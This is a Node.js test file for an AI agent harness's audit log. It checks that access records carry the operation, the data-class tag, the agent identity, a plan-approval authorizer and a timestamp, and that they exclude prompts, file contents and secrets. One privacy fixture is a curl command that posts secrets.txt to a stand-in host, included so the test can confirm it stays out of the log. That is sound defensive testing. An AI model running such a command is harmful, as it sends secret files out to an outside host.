// SPDX-License-Identifier: AGPL-3.0-or-later
//
// Black-box acceptance tests for the attribution record (harness-governance Tranche 3, Step 30): the access record
// that audit.jsonl holds, the human authorizer resolver, and the privacy bound on both.
//
// Sources: docs/requirements/FR-NFR-harness-governance.md section 2.14 (FR-227: Complete record, No human authorizer),
// NFR-031, NFR-026; specs/spec-hooks-audit.md, Change Log 2026-11-06 (Tranche 3), "Requirement: Attribution record
// schema" (Scenarios: Complete record, Secret kept out of the access record) and "Requirement: Human authorizer
// resolution" (Scenarios: Complete authorizer, No human authorizer); DECISIONS.md, 2026-10-30, "Judgement-gate evidence
// and the /do human authorizer settled" (the authorizer is a reference to the plan approval, never message text, and
// `none` with a reason when no user approved the plan). Task plan: docs/task-plans/task-plan-harness-governance-
// 20261028-0759.md, Steps 22 and 30.
//
// Traceability format: [AC-N | Requirement | spec-hooks-audit | FR-227 | UR-066 | BR-020 | NFR-031]. The spec carries no
// SPEC-NNN id. AC-N is the position of the Scenario inside its Requirement:
//   Attribution record schema: AC-1 Complete record, AC-2 Secret kept out of the access record
//   Human authorizer resolution: AC-1 Complete authorizer, AC-2 No human authorizer
// The Requirement name is cited next to the AC number.
//
// Public interface used (module exports and header contracts):
//   lib/audit-chain.js   attribute(parts), append(record, {root}), verify(location, {root}), AuditError, logPath(root)
//     An attributed access event holds `operation`, `data_class`, optional `path`, `agent_type`, optional `agent_id`,
//     `authorizer`, optional `authorizer_reason`, and the `ts` that append() sets. A record with an `operation` and a
//     missing field is refused with an AuditError. A missing data_class becomes "none"; a missing authorizer becomes
//     "none" with the reason "unresolved". attribute() and append() both refuse an authorizer that is message text.
//   lib/authorizer.js    fields(input, {root, autonomous, messageId}) -> {authorizer, authorizer_reason?}
//     The authorizer resolves the newest plan file under <root>/.agent/main-plan/ (plan-*.md) whose "**Status:**" line
//     reads Approved or In Progress and whose "## User Decisions" section holds a "- Approved: YYYY-MM-DD HH:mm" bullet.
//     It is a reference to the plan approval ("plan-approval:<plan file>@<time>") or to the approval message
//     ("approval-message:<id>"), or "none" with a reason. It is never omitted and never message text.
//   lib/identity.js      fields(input) -> {agent_type, agent_id?}
//   hooks/data-access-log.js  PreToolUse command entry that writes the access record of a tagged-path access.
//
// Every project root is a temp directory with a .git directory.
//
// Run: node --test tests/hooks/attribution-record.test.js

"use strict";

const { test, after } = require("node:test");
const assert = require("node:assert");
const fs = require("node:fs");
const path = require("node:path");

const fx = require("../fixtures/audit/chain-fixture.js");

const PLUGIN = fx.PLUGIN;
const audit = fx.auditChain;
const identity = require(path.join(PLUGIN, "hooks", "lib", "identity.js"));
const authorizer = require(path.join(PLUGIN, "hooks", "lib", "authorizer.js"));

const PLAN_NAME = "plan-attribution-20261106";
const SECRET_PROMPT = "SECRET-MESSAGE-TEXT-77 please go ahead and approve everything";

after(() => {
  fx.cleanup();
});

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function writeFile(root, relative, text) {
  const file = path.join(root, relative);
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, typeof text === "string" ? text : JSON.stringify(text));
  return file;
}

// The plan /do writes at approval, in the format the authorizer reads: a Status line of Approved and, under the
// "## User Decisions" heading, the bullet "- Approved: YYYY-MM-DD HH:mm".
function approvedPlan(root) {
  return writeFile(
    root,
    ".agent/main-plan/" + PLAN_NAME + ".md",
    ["# Plan: attribution fixture", "", "**Status:** Approved", "", "## Summary", "", "Fixture plan for the attribution tests.", "", "## User Decisions", "", "- Approved: 2026-11-06 13:05", ""].join("\n")
  );
}

// A plan that has not been approved: a Draft status and no Approved bullet.
function unapprovedPlan(root) {
  return writeFile(
    root,
    ".agent/main-plan/plan-unapproved-20261106.md",
    ["# Plan: unapproved fixture", "", "**Status:** Draft", "", "## Summary", "", "Fixture plan, not approved.", "", "## User Decisions", "", "- None yet", ""].join("\n")
  );
}

function plainInput(root, extra) {
  return Object.assign({ hook_event_name: "PreToolUse", session_id: "sess-attr-1", cwd: root }, extra || {});
}

function preToolUse(root, tool, toolInput, extra) {
  return Object.assign({ hook_event_name: "PreToolUse", session_id: "sess-attr-1", tool_name: tool, tool_input: toolInput, cwd: root }, extra || {});
}

function profileWithStudentRecords(root) {
  writeFile(root, ".agent/governance/profile.json", { data_classes: { "student-record": ["records/**"], PHI: ["data/patients*.csv"] } });
}

function accessRecords(root) {
  return fx.readRecords(root).filter((record) => record.operation !== undefined);
}

function parts(root, extra) {
  return Object.assign(
    { event: "tool-access", operation: "read", path: "records/grades.csv", data_class: "student-record" },
    identity.fields({ agent_type: "developer", agent_id: "agent-dev-1" }),
    authorizer.fields(plainInput(root), { root: root }),
    extra || {}
  );
}

function assertAllFiveFields(record) {
  assert.strictEqual(typeof record.operation, "string", "operation");
  assert.ok(record.operation.length > 0);
  assert.strictEqual(typeof record.data_class, "string", "data accessed: the data-class tag");
  assert.ok(record.data_class.length > 0);
  assert.strictEqual(typeof record.path, "string", "data accessed: the path");
  assert.strictEqual(typeof record.agent_type, "string", "agent identity");
  assert.ok(record.agent_type.trim().length > 0);
  assert.strictEqual(typeof record.authorizer, "string", "human authorizer");
  assert.ok(record.authorizer.trim().length > 0);
  assert.ok(Number.isFinite(Date.parse(record.ts)), "timestamp: " + record.ts);
}

function assertNoContent(text, needles) {
  needles.forEach((needle) => {
    assert.ok(text.indexOf(needle) === -1, "found " + JSON.stringify(needle) + " in: " + text.slice(0, 400));
  });
}

// ---------------------------------------------------------------------------
// Requirement: Human authorizer resolution
// ---------------------------------------------------------------------------

test("[AC-1 | Human authorizer resolution | spec-hooks-audit | FR-227 | UR-066 | BR-020] a user-approved plan gives an authorizer that references the plan approval", () => {
  const root = fx.tempRoot("attribution-auth-");
  approvedPlan(root);
  const slot = authorizer.fields(plainInput(root), { root: root });
  assert.strictEqual(typeof slot.authorizer, "string");
  assert.notStrictEqual(slot.authorizer, "none", "an approved plan is a human authorizer");
  assert.ok(slot.authorizer.indexOf(PLAN_NAME) !== -1, "the reference names the plan: " + slot.authorizer);
  assert.ok(slot.authorizer_reason === undefined || slot.authorizer_reason === null, "no reason is needed for a real authorizer");
});

test("[AC-1 | Human authorizer resolution | spec-hooks-audit | FR-227 | NFR-031] the authorizer is a reference, never the message text, even when the input carries the user's message", () => {
  const root = fx.tempRoot("attribution-auth-");
  approvedPlan(root);
  const input = plainInput(root, { prompt: SECRET_PROMPT, user_prompt: SECRET_PROMPT, last_assistant_message: SECRET_PROMPT });
  const slot = authorizer.fields(input, { root: root });
  assertNoContent(JSON.stringify(slot), ["SECRET-MESSAGE-TEXT-77", "go ahead", "approve everything"]);
  const withId = authorizer.fields(input, { root: root, messageId: "msg-0042" });
  assertNoContent(JSON.stringify(withId), ["SECRET-MESSAGE-TEXT-77", "go ahead", "approve everything"]);
  assert.notStrictEqual(withId.authorizer, "none");
});

[
  ["no plan directory at all", (root) => root],
  ["a plan that holds no approval", (root) => { unapprovedPlan(root); return root; }],
  ["an empty plan directory", (root) => { fs.mkdirSync(path.join(root, ".agent", "main-plan"), { recursive: true }); return root; }],
].forEach((row) => {
  test("[AC-2 | Human authorizer resolution | spec-hooks-audit | FR-227 | UR-066] " + row[0] + " reads none with a reason, and the field is not omitted", () => {
    const root = row[1](fx.tempRoot("attribution-none-"));
    const slot = authorizer.fields(plainInput(root), { root: root });
    assert.ok(Object.prototype.hasOwnProperty.call(slot, "authorizer"), "the authorizer field is present");
    assert.strictEqual(slot.authorizer, "none");
    assert.strictEqual(typeof slot.authorizer_reason, "string");
    assert.ok(slot.authorizer_reason.trim().length > 0, "the reason is not blank");
  });
});

test("[AC-2 | Human authorizer resolution | spec-hooks-audit | FR-227 | UR-066] an autonomous action reads none with a reason even when an approved plan exists", () => {
  const root = fx.tempRoot("attribution-auto-");
  approvedPlan(root);
  const slot = authorizer.fields(plainInput(root), { root: root, autonomous: true });
  assert.strictEqual(slot.authorizer, "none");
  assert.ok(typeof slot.authorizer_reason === "string" && slot.authorizer_reason.trim().length > 0);
});

[
  ["null input", null],
  ["undefined input", undefined],
  ["a string input", "text"],
  ["an array input", []],
  ["an input with no cwd", {}],
].forEach((row) => {
  test("[AC-2 | Human authorizer resolution | spec-hooks-audit | FR-227] " + row[0] + " with no root reads none with a reason and does not throw", () => {
    // Null, empty, and type-mismatch input space: the field is never omitted and the resolver never throws.
    let slot;
    assert.doesNotThrow(() => {
      slot = authorizer.fields(row[1], {});
    });
    assert.strictEqual(slot.authorizer, "none");
    assert.ok(typeof slot.authorizer_reason === "string" && slot.authorizer_reason.trim().length > 0);
  });
});

// ---------------------------------------------------------------------------
// Requirement: Attribution record schema
// ---------------------------------------------------------------------------

test("[AC-1 | Attribution record schema | spec-hooks-audit | FR-227 | UR-066 | BR-020] an appended access record holds all five fields: operation, path and data-class tag, agent identity, human authorizer, timestamp", () => {
  const root = fx.tempRoot("attribution-record-");
  approvedPlan(root);
  const record = audit.attribute(parts(root));
  const res = audit.append(record, { root: root });
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  const stored = accessRecords(root);
  assert.strictEqual(stored.length, 1);
  assertAllFiveFields(stored[0]);
  assert.strictEqual(stored[0].operation, "read");
  assert.strictEqual(stored[0].path, "records/grades.csv");
  assert.strictEqual(stored[0].data_class, "student-record");
  assert.strictEqual(stored[0].agent_type, "developer");
  assert.strictEqual(stored[0].agent_id, "agent-dev-1");
  assert.ok(stored[0].authorizer.indexOf(PLAN_NAME) !== -1, "the authorizer references the plan approval: " + stored[0].authorizer);
});

test("[AC-1 | Attribution record schema | spec-hooks-audit | FR-227 | NFR-026] an access record joins the hash chain and the chain verifies", () => {
  const root = fx.tempRoot("attribution-chain-");
  fx.writeChain(root, [3]);
  const res = audit.append(audit.attribute(parts(root)), { root: root });
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  const lines = fx.readAllLines(root);
  assert.strictEqual(lines.length, 4);
  assert.strictEqual(JSON.parse(lines[3]).prev, fx.sha256Hex(lines[2]));
  assert.strictEqual(audit.verify(audit.logPath(root), { root: root }).ok, true);
});

test("[AC-2 | Human authorizer resolution | spec-hooks-audit | FR-227 | UR-066] an access record with no user approval holds authorizer none and a reason, and both are stored", () => {
  const root = fx.tempRoot("attribution-record-none-");
  const res = audit.append(audit.attribute(parts(root)), { root: root });
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  const stored = accessRecords(root);
  assert.strictEqual(stored.length, 1);
  assertAllFiveFields(stored[0]);
  assert.strictEqual(stored[0].authorizer, "none");
  assert.ok(typeof stored[0].authorizer_reason === "string" && stored[0].authorizer_reason.trim().length > 0, JSON.stringify(stored[0]));
});

test("[AC-2 | Human authorizer resolution | spec-hooks-audit | FR-227] attribute() with no authorizer and no data class still fills both: none with the reason unresolved, and the data class none", () => {
  // Null/empty input space: the field is never omitted.
  const record = audit.attribute({ event: "tool-access", operation: "read", path: "src/app.js", agent_type: "developer", agent_id: "agent-dev-1" });
  assert.strictEqual(record.authorizer, "none");
  assert.strictEqual(record.authorizer_reason, "unresolved");
  assert.strictEqual(record.data_class, "none");
  const res = audit.append(record, { root: fx.tempRoot("attribution-defaults-") });
  assert.strictEqual(res.ok, true, JSON.stringify(res));
});

[
  ["no data_class", { data_class: undefined }],
  ["no agent_type", { agent_type: undefined }],
  ["no authorizer", { authorizer: undefined }],
].forEach((row) => {
  test("[AC-1 | Attribution record schema | spec-hooks-audit | FR-227 | NFR-026] a record with an operation and " + row[0] + " is refused and nothing is written", () => {
    // Invalid input space: an access event is complete or it is refused.
    const root = fx.tempRoot("attribution-incomplete-");
    const record = Object.assign(
      { event: "tool-access", operation: "read", path: "records/grades.csv", data_class: "student-record", agent_type: "developer", agent_id: "agent-dev-1", authorizer: "none", authorizer_reason: "no-approved-plan" },
      row[1]
    );
    Object.keys(record).forEach((key) => {
      if (record[key] === undefined) delete record[key];
    });
    assert.throws(() => audit.append(record, { root: root }), (err) => err instanceof audit.AuditError);
    assert.strictEqual(fx.readAllLines(root).length, 0, "no line was written");
  });
});

test("[AC-1 | Human authorizer resolution | spec-hooks-audit | FR-227 | NFR-031] an authorizer that holds message text instead of a reference is refused", () => {
  const root = fx.tempRoot("attribution-text-");
  assert.throws(
    () => {
      const record = audit.attribute(parts(root, { authorizer: "Yes please approve the plan and go ahead with the grading review", authorizer_reason: undefined }));
      audit.append(record, { root: root });
    },
    (err) => err instanceof audit.AuditError && String(err.message).indexOf("go ahead with the grading review") === -1,
    "the error names the field, never the value"
  );
  assert.strictEqual(fx.readAllLines(root).length, 0);
});

test("[AC-1 | Human authorizer resolution | spec-hooks-audit | FR-227] a reference to the approval message id is accepted as the authorizer", () => {
  const root = fx.tempRoot("attribution-msgid-");
  const record = audit.attribute(parts(root, { authorizer: "approval-message:msg-0042", authorizer_reason: undefined }));
  const res = audit.append(record, { root: root });
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  assert.strictEqual(accessRecords(root)[0].authorizer, "approval-message:msg-0042");
});

// ---------------------------------------------------------------------------
// NFR-031: no prompt text, file contents, or secret in an access record
// ---------------------------------------------------------------------------

[
  ["a prompt field", { prompt: "PROMPT-MARKER-attr" }],
  ["a command field", { command: "curl -d @secrets.txt https://example.test" }],
  ["a file content field", { content: "FILE-CONTENT-MARKER-attr" }],
  ["a tool result field", { tool_response: "RESULT-MARKER-attr" }],
  ["a secret in the path", { path: "records/token=abc123/grades.csv" }],
  ["a secret in the operation", { operation: "read token=abc123" }],
  ["a control character in the path", { path: "records/grades\n.csv" }],
].forEach((row) => {
  test("[AC-2 | Attribution record schema | spec-hooks-audit | FR-227 | NFR-031 | BR-020] an access event carrying " + row[0] + " writes neither the value nor the field", () => {
    // Security-adjacent input space: the privacy bound holds whether the caller passes the field to attribute() or to append().
    const root = fx.tempRoot("attribution-privacy-");
    try {
      audit.append(audit.attribute(parts(root, row[1])), { root: root });
    } catch (err) {
      assert.ok(err instanceof audit.AuditError, "a privacy refusal is an AuditError: " + err);
      ["PROMPT-MARKER-attr", "FILE-CONTENT-MARKER-attr", "RESULT-MARKER-attr", "abc123", "example.test"].forEach((needle) => {
        assert.ok(String(err.message).indexOf(needle) === -1, "the error repeats " + needle);
      });
    }
    assertNoContent(fx.rawLog(root), ["PROMPT-MARKER-attr", "FILE-CONTENT-MARKER-attr", "RESULT-MARKER-attr", "abc123", "example.test", "curl", "secrets.txt"]);
  });
});

test("[AC-2 | Attribution record schema | spec-hooks-audit | FR-227 | NFR-031] an access record that is appended holds no field named for content", () => {
  const root = fx.tempRoot("attribution-keys-");
  try {
    audit.append(audit.attribute(parts(root, { prompt: "PROMPT-MARKER-keys", command: "COMMAND-MARKER-keys" })), { root: root });
  } catch (err) {
    assert.ok(err instanceof audit.AuditError, String(err));
  }
  fx.readRecords(root).forEach((record) => {
    Object.keys(record).forEach((key) => {
      assert.ok(!/command|content|prompt|text|body|secret|token|input|output|response|stdout|stderr/i.test(key), "unexpected field: " + key);
    });
  });
  assertNoContent(fx.rawLog(root), ["PROMPT-MARKER-keys", "COMMAND-MARKER-keys"]);
});

// ---------------------------------------------------------------------------
// The data-access-log hook writes the same record for a real access
// ---------------------------------------------------------------------------

test("[AC-1 | Attribution record schema | spec-hooks-audit | FR-227 | FR-230 | UR-066 | BR-020] a subagent's read of a student-record path under an approved plan logs all five fields and the plan approval reference", () => {
  const root = fx.tempRoot("attribution-hook-");
  profileWithStudentRecords(root);
  approvedPlan(root);
  const doc = preToolUse(root, "Read", { file_path: path.join(root, "records", "grades.csv") }, { agent_type: "developer", agent_id: "agent-dev-3" });
  const res = fx.runHook("data-access-log", doc);
  assert.strictEqual(res.status, 0, res.stderr);
  const stored = accessRecords(root);
  assert.strictEqual(stored.length, 1, JSON.stringify(fx.readRecords(root)));
  assertAllFiveFields(stored[0]);
  assert.ok(String(stored[0].path).endsWith("records/grades.csv"), stored[0].path);
  assert.strictEqual(stored[0].data_class, "student-record");
  assert.strictEqual(stored[0].agent_type, "developer");
  assert.strictEqual(stored[0].agent_id, "agent-dev-3");
  assert.ok(stored[0].authorizer.indexOf(PLAN_NAME) !== -1, "the authorizer references the plan approval: " + stored[0].authorizer);
  assert.ok(Math.abs(Date.now() - Date.parse(stored[0].ts)) < 5 * 60 * 1000, "the timestamp is the time of the access: " + stored[0].ts);
});

test("[AC-2 | Human authorizer resolution | spec-hooks-audit | FR-227 | FR-230 | UR-066] an access with no approved plan logs authorizer none with a reason, and the field is present", () => {
  const root = fx.tempRoot("attribution-hook-none-");
  profileWithStudentRecords(root);
  const doc = preToolUse(root, "Read", { file_path: path.join(root, "records", "grades.csv") }, { agent_type: "developer", agent_id: "agent-dev-3" });
  const res = fx.runHook("data-access-log", doc);
  assert.strictEqual(res.status, 0, res.stderr);
  const stored = accessRecords(root);
  assert.strictEqual(stored.length, 1, JSON.stringify(fx.readRecords(root)));
  assert.strictEqual(stored[0].authorizer, "none");
  assert.ok(typeof stored[0].authorizer_reason === "string" && stored[0].authorizer_reason.trim().length > 0, JSON.stringify(stored[0]));
});

test("[AC-2 | Attribution record schema | spec-hooks-audit | FR-227 | NFR-031] an access whose context holds a secret, a prompt, and file content logs the path and the tag and none of the three", () => {
  const root = fx.tempRoot("attribution-hook-secret-");
  profileWithStudentRecords(root);
  approvedPlan(root);
  const doc = preToolUse(
    root,
    "Write",
    { file_path: path.join(root, "records", "grades.csv"), content: "FILE-CONTENT-MARKER-hook token=abc123 SECRET-BODY" },
    { agent_type: "developer", agent_id: "agent-dev-3", prompt: SECRET_PROMPT, user_prompt: SECRET_PROMPT }
  );
  const res = fx.runHook("data-access-log", doc);
  assert.strictEqual(res.status, 0, res.stderr);
  const stored = accessRecords(root);
  assert.strictEqual(stored.length, 1, JSON.stringify(fx.readRecords(root)));
  assert.ok(String(stored[0].path).endsWith("records/grades.csv"));
  assert.strictEqual(stored[0].data_class, "student-record");
  assertNoContent(fx.rawLog(root), ["FILE-CONTENT-MARKER-hook", "abc123", "token=", "SECRET-BODY", "SECRET-MESSAGE-TEXT-77", "go ahead"]);
});

test("[AC-1 | Attribution record schema | spec-hooks-audit | FR-227 | NFR-026] the records of several accesses chain, and the chain verifies", () => {
  const root = fx.tempRoot("attribution-hook-chain-");
  profileWithStudentRecords(root);
  ["Read", "Edit", "Write"].forEach((tool) => {
    const res = fx.runHook("data-access-log", preToolUse(root, tool, { file_path: path.join(root, "records", "grades.csv") }, { agent_type: "developer", agent_id: "agent-dev-3" }));
    assert.strictEqual(res.status, 0, res.stderr);
  });
  assert.strictEqual(accessRecords(root).length, 3);
  const result = audit.verify(audit.logPath(root), { root: root });
  assert.strictEqual(result.ok, true, JSON.stringify(result));
});
